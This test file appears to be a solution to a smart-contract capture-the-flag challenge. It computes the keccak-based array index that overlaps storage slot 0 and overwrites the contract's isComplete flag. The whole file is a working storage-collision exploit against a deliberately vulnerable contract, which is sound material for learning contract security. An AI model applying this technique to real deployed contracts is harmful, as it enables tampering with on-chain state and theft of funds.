import { expect } from 'chai';
import { ethers } from 'hardhat';

/**
 * isComplete (bool) is stored at storage slot 0
 * map (uint256[]) is stored at storage slot 1
 * and elements of map are stored at keccak(p) + 1 with p the storage slot of map
 * We need to find the index such that map[index] is stored at slot 0
 */
describe('Mapping', function () {
  it('should override isComplete variable', async function () {
    const Challenge = await ethers.getContractFactory('Mapping');
    const challenge = await Challenge.deploy();
    await challenge.deployed();

    let tx = await challenge.set(0, 1);
    await tx.wait();

    // storage slot where map[0] is stored
    const storageSlot = ethers.utils.solidityKeccak256(['uint256'], [1]);

    /**
     *     storageSlot + index = 0
     * <=> storageSlot + index = 2 ** 256 (uint256)
     * <=> index = 2 ** 256 - storageSlot
     */

    const MAX_UINT256 = ethers.BigNumber.from(2).pow(256).sub(1);
    const index = MAX_UINT256.sub(ethers.BigNumber.from(storageSlot)).add(1);
    const index_hex = ethers.utils.hexlify(index);

    tx = await challenge.set(MAX_UINT256.sub(1), 0);
    await tx.wait();

    // boolean true in bytes32
    const value = ethers.utils.hexZeroPad(ethers.utils.hexlify(1), 32);

    // override isComplete
    tx = await challenge.set(index_hex, value);
    await tx.wait();

    expect(await challenge.isComplete()).to.be.true;
  });
});
